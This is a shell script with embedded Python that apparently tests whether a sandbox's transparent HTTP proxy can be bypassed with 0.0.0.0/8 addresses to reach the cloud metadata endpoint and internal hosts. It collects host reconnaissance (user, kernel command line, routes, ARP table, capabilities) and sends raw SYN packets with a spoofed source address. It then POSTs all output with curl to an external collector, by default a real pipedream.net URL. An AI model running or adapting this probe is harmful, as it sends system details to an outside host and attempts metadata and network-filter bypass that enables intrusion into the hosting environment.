#!/bin/sh
# zero-net-http-probe.sh
#
# Usage:
#   COLLECTOR_URL="https://your-collector.example/path" sh zero-net-http-probe.sh
#
# Purpose:
# - Test whether 0.0.0.1 and 0.255.255.255 are classified like private/reserved
#   destinations by the transparent HTTP proxy.
# - Compare against 169.254.169.254 and 10.0.0.1.
#
# Safety:
# - No token/credential metadata paths.
# - No broad scanning.
# - Only 4 target IPs and port 80.
# - Output is capped.

COLLECTOR_URL="${COLLECTOR_URL:-https://eoqy29v9qqzscf0.m.pipedream.net/}"
POST_TIMEOUT="${POST_TIMEOUT:-20}"

(
set -x

echo "=============================="
echo "=== context =================="
echo "=============================="
date
id
uname -a
hostname -I 2>&1 || true
cat /proc/cmdline 2>&1 || true
cat /proc/net/route 2>&1 || true
cat /proc/net/arp 2>&1 || true
cat /proc/net/dev 2>&1 || true
cat /sys/class/net/eth0/address 2>&1 || true
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp' /proc/self/status 2>&1 || true

echo
echo "=============================="
echo "=== normal socket HTTP ======="
echo "=============================="
python3 - <<'PY' 2>&1 || true
import socket

targets = [
    "0.0.0.1",
    "0.255.255.255",
    "169.254.169.254",
    "10.0.0.1",
]

payloads = [
    ("h10_no_host_root",
     b"GET / HTTP/1.0\r\n\r\n"),

    ("h10_no_host_metadata_root_only",
     b"GET /computeMetadata/v1/ HTTP/1.0\r\n\r\n"),

    ("h11_no_host",
     b"GET / HTTP/1.1\r\nConnection: close\r\n\r\n"),

    ("h11_empty_host",
     b"GET / HTTP/1.1\r\nHost:\r\nConnection: close\r\n\r\n"),

    ("h11_space_host",
     b"GET / HTTP/1.1\r\nHost: \r\nConnection: close\r\n\r\n"),

    ("h11_host_self", None),

    ("absolute_form_self", None),
]

for host in targets:
    for name, payload in payloads:
        if name == "h11_host_self":
            payload = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode()
        elif name == "absolute_form_self":
            payload = f"GET http://{host}/ HTTP/1.0\r\n\r\n".encode()

        print(f"================ {host}:80 {name} ================")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        try:
            s.connect((host, 80))
            print("CONNECT_OK", s.getsockname(), "->", s.getpeername())
            s.sendall(payload)
            print("REQUEST_BEGIN")
            print(payload.decode("utf-8", "replace"))
            print("REQUEST_END")
            out = b""
            while len(out) < 4096:
                try:
                    c = s.recv(4096 - len(out))
                except socket.timeout:
                    break
                if not c:
                    break
                out += c
            print("RESPONSE_BEGIN")
            print(out.decode("utf-8", "replace"))
            print("RESPONSE_END")
        except Exception as e:
            print("FAIL", type(e).__name__, e)
        finally:
            try:
                s.close()
            except Exception:
                pass
PY

echo
echo "=============================="
echo "=== raw SYN confirmation ====="
echo "=============================="
python3 - <<'PY' 2>&1 || true
import socket, struct, random, time, select

IFACE = "eth0"
SRC_IP = "192.0.2.2"
GW_MAC = "02:fc:00:00:00:05"
TARGETS = ["0.0.0.1", "0.255.255.255", "169.254.169.254", "10.0.0.1"]
PORTS = [80, 443]

def mac_bytes(s):
    return bytes(int(x, 16) for x in s.split(":"))

def get_iface_mac(iface):
    with open(f"/sys/class/net/{iface}/address") as f:
        return mac_bytes(f.read().strip())

def checksum(data):
    if len(data) % 2:
        data += b"\0"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
    total = (total >> 16) + (total & 0xffff)
    total += total >> 16
    return (~total) & 0xffff

def build_syn(src_ip, dst_ip, sport, dport, seq):
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)

    iphdr = struct.pack(
        "!BBHHHBBH4s4s",
        0x45, 0, 40, random.randrange(0, 65535), 0, 64,
        socket.IPPROTO_TCP, 0, src, dst
    )
    iphdr = iphdr[:10] + struct.pack("!H", checksum(iphdr)) + iphdr[12:]

    tcp = struct.pack(
        "!HHLLBBHHH",
        sport, dport, seq, 0, 5 << 4, 0x02, 64240, 0, 0
    )
    pseudo = src + dst + struct.pack("!BBH", 0, socket.IPPROTO_TCP, len(tcp))
    tcp = tcp[:16] + struct.pack("!H", checksum(pseudo + tcp)) + tcp[18:]

    return iphdr + tcp

def eth_frame(src_mac, dst_mac, payload):
    return dst_mac + src_mac + b"\x08\x00" + payload

def parse_eth_ipv4(frame):
    if len(frame) < 34 or frame[12:14] != b"\x08\x00":
        return None
    pkt = frame[14:]
    ihl = (pkt[0] & 0xf) * 4
    proto = pkt[9]
    src = socket.inet_ntoa(pkt[12:16])
    dst = socket.inet_ntoa(pkt[16:20])
    return pkt, ihl, proto, src, dst

def flags_str(flags):
    out = []
    for bit, name in [(0x01,"FIN"),(0x02,"SYN"),(0x04,"RST"),(0x08,"PSH"),(0x10,"ACK")]:
        if flags & bit:
            out.append(name)
    return ",".join(out) or "-"

src_mac = get_iface_mac(IFACE)
gw_mac = mac_bytes(GW_MAC)

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
sock.bind((IFACE, 0))
sock.setblocking(False)

probes = {}

for dst in TARGETS:
    for dport in PORTS:
        sport = random.randrange(30000, 60000)
        seq = random.randrange(0, 2**32 - 1)
        probes[(dst, dport, sport)] = "NO_RESPONSE"
        pkt = build_syn(SRC_IP, dst, sport, dport, seq)
        sock.send(eth_frame(src_mac, gw_mac, pkt))
        print(f"SENT {SRC_IP}:{sport}->{dst}:{dport} seq={seq}")

deadline = time.time() + 4

while time.time() < deadline:
    r, _, _ = select.select([sock], [], [], 0.25)
    if not r:
        continue
    frame = sock.recv(65535)
    parsed = parse_eth_ipv4(frame)
    if not parsed:
        continue
    pkt, ihl, proto, ip_src, ip_dst = parsed
    if proto != socket.IPPROTO_TCP or len(pkt) < ihl + 20:
        continue
    sport, dport, seq, ack, off_flags, win, csum, urg = struct.unpack("!HHIIHHHH", pkt[ihl:ihl+20])
    flags = off_flags & 0x01ff

    for (dst, target_port, our_sport), old in list(probes.items()):
        if ip_src == dst and ip_dst == SRC_IP and sport == target_port and dport == our_sport:
            probes[(dst, target_port, our_sport)] = flags_str(flags)
            print(f"RECV {ip_src}:{sport}->{ip_dst}:{dport} flags={flags_str(flags)} seq={seq} ack={ack}")

print("=== RAW SYN SUMMARY ===")
for dst in TARGETS:
    for port in PORTS:
        result = "?"
        for (p_dst, p_port, p_sport), value in probes.items():
            if p_dst == dst and p_port == port:
                result = value
                break
        print(f"{dst}:{port} {result}")

sock.close()
PY

echo
echo "=============================="
echo "=== interpretation hints ====="
echo "=============================="
echo "Interesting outcomes:"
echo "- 0.0.0.1 or 0.255.255.255 returns something other than private_dest_ip / 400 / 426."
echo "- /computeMetadata/v1/ returns metadata-like content; stop before token paths."
echo "- 0/8 behaves less strictly than 169.254.169.254 or 10.0.0.1."
echo ""
echo "Likely benign outcomes:"
echo "- 403 private_dest_ip: classifier handles 0/8."
echo "- 426 Upgrade Required: proxy default/upgrade path, not metadata access."
echo "- 400 Bad Request: parser rejected missing/blank Host."

) 2>&1 | curl -s -m "$POST_TIMEOUT" -X POST --data-binary @- "$COLLECTOR_URL"
